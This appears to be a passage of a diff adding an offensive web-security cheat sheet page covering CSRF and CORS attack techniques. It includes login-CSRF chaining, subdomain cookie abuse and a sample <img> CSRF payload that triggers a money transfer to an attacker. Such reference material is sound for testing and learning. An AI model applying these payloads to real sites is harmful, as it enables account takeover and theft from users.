+<p>Logout endpoint that doesn&rsquo;t require CSRF protection isn&rsquo;t exploitable on its own. But chained: log victim out, log them back in as YOUR account, they store data in your account that you later access.</p>
+<h3 id="login-csrf" data-heading-permalink="true"><span class="heading-content">Login CSRF</span>
+    <a class="heading-permalink" href="#login-csrf" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Same idea: force victim to log into attacker&rsquo;s account. They use the app thinking it&rsquo;s theirs, leave data you can later access. Real attacks: storing browsing history, OAuth account linking, payment info.</p>
+<h3 id="csrf-via-img-tag-for-get-endpoints" data-heading-permalink="true"><span class="heading-content">CSRF via <code>&lt;img&gt;</code> tag for GET endpoints</span>
+    <a class="heading-permalink" href="#csrf-via-img-tag-for-get-endpoints" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>If state changes happen on GET (bad practice but common):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://target.com/transfer?amount=1000&amp;to=attacker&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>Fires when the victim visits the attacker page. No JS needed.</p>
+<h3 id="csrf-token-leak-via-referer" data-heading-permalink="true"><span class="heading-content">CSRF token leak via referer</span>
+    <a class="heading-permalink" href="#csrf-token-leak-via-referer" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>If the CSRF token is in the URL (<code>?csrf_token=abc</code>) and the page contains an external link, the token leaks in the Referer header to that external site.</p>
+<h3 id="race-condition-with-csrf" data-heading-permalink="true"><span class="heading-content">Race condition with CSRF</span>
+    <a class="heading-permalink" href="#race-condition-with-csrf" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Some apps tie CSRF tokens to user state (&ldquo;token only valid before action&rdquo;). A race between fetching the token and submitting the action can bypass timing-based checks.</p>
+<h3 id="cookie-scoping-for-subdomain-abuse" data-heading-permalink="true"><span class="heading-content">Cookie scoping for subdomain abuse</span>
+    <a class="heading-permalink" href="#cookie-scoping-for-subdomain-abuse" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Cookie set with <code>Domain=.target.com</code> is sent to all subdomains. If <code>admin.target.com</code> has CSRF and you control <code>dev.target.com</code> (subdomain takeover or XSS), you can craft requests with the admin&rsquo;s cookies.</p>
+<h3 id="cors-pre-flight-bypass-via-simple-requests" data-heading-permalink="true"><span class="heading-content">CORS pre-flight bypass via simple requests</span>
+    <a class="heading-permalink" href="#cors-pre-flight-bypass-via-simple-requests" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Pre-flight only fires for non-simple requests. Simple requests (GET/POST with form-encoded or text/plain body, no custom headers) don&rsquo;t trigger preflight. So:</p>
+<ul>
+<li>Even when ACAO is restrictive, the request still fires (just the response isn&rsquo;t readable)</li>
+<li>For pure CSRF (don&rsquo;t need to read response), preflight bypass doesn&rsquo;t matter</li>
+</ul>
+<h2 id="xi-references" data-heading-permalink="true"><span class="heading-content">xi. References</span>
+    <a class="heading-permalink" href="#xi-references" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/csrf" target="_blank" rel="noopener noreferrer">PortSwigger - CSRF</a>
+</li>
+<li><a href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener noreferrer">PortSwigger - CORS</a>
+</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - CSRF</a>
+</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - CORS</a>
+</li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery" target="_blank" rel="noopener noreferrer">HackTricks - CSRF</a>
+</li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/cors-bypass" target="_blank" rel="noopener noreferrer">HackTricks - CORS</a>
+</li>
+<li><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank" rel="noopener noreferrer">James Kettle - Exploiting CORS</a>
+</li>
+</ul>
+<h2 id="xii-where-it-leads" data-heading-permalink="true"><span class="heading-content">xii. Where it leads</span>
+    <a class="heading-permalink" href="#xii-where-it-leads" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>CSRF outcomes:</p>
+<ul>
+<li>Account takeover via email / password change</li>
+<li>Admin actions performed as victim admin</li>
+<li>Privilege escalation when admin endpoints lack CSRF protection</li>
+<li>Data exfil when the attacker can also read the response (combined with XSS or CORS)</li>
+</ul>
+<p>CORS outcomes:</p>
+<ul>
+<li>Read user&rsquo;s private data (<code>/api/me</code>, profile, financial)</li>
+<li>Steal session tokens / API keys returned in JSON responses</li>
+<li>Internal app reconnaissance via cross-origin XHR</li>
+<li>CSWSH gives full bidirectional WebSocket hijack</li>
+</ul>
+<p>Both pair powerfully with [[WEB08 XSS]] - XSS bypasses CSRF protections entirely (same-origin), and XSS + reflected ACAO lets the attacker page read responses too.</p>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/web/web07-xxe/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">XXE</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/web/web10-request-smuggling/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">Request Smuggling</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
